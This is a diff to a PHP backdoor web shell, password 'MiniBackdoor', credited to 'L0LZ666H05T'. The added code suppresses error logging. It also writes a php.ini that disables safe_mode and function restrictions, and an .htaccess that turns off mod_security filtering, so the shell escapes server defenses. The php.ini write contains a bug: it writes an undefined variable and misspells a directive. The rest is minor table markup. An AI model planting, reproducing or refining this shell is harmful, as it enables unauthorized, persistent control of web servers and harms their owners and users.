@@ -3,19 +3,34 @@ error_reporting(0);
 session_start();
 set_time_limit(0);
 ignore_user_abort(0);
-@ini_set('max_execution_time', 0);
-@ini_set('memory_limit', '999999999M');
-@ini_set('zlib.output_compression', 'Off');
-@ini_restore('safe_mode');
-@ini_restore("safe_mode_include_dir");
-@ini_restore("safe_mode_exec_dir");
-@ini_restore("disable_functions");
-@ini_restore("allow_url_fopen");
-@ini_restore("open_basedir");
+@clearstatcache();
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@ini_set('output_buffering',0);
+@ini_set('display_errors', 0);
 $password = "MiniBackdoor";
 function home() {
   $home = "http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."";
   ?> <script type="text/javascript">window.location='<?php print $home ?>';</script> <?php
+}
+if (file_exists('php.ini')) {
+} else {
+  $files = @fopen('php.ini', 'w');
+  $text  = "safe_mode = OFF 
+            disable_funtions = NONE";
+  @fwrite($files, $sec);
+  @fclose($files);
+}
+if (file_exists('.htaccess')) {
+} else {
+  $files2 = @fopen('.htaccess', 'w');
+  $text2  = "<IfModule mod_security.c>
+    SecFilterEngine Off
+    SecFilterScanPOST Off
+    </IfModule>";
+  @fwrite($files2, $text2);
+  @fclose($files2); 
 }
 if ($_GET['action'] == 'home') {
   @home();
@@ -736,6 +751,7 @@ foreach (@scandir(@cwd()) as $dir) {
   </td>
   <?php
 }
+?> <tr><th colspan="4"></th></tr> <?php
 foreach (@scandir(@cwd()) as $file) {
   if (!is_file($file)) continue;
   ?><tr class="hover" style="border:none;"><td style="border:none;">
@@ -771,7 +787,7 @@ foreach (@scandir(@cwd()) as $file) {
   <?php
 }
 ?>
-<tr style="border:none;"> 
+<tr style="border:none;">
   <th colspan="4">
     &copy; L0LZ666H05T - <?php print @date("Y") ?>
   </th>
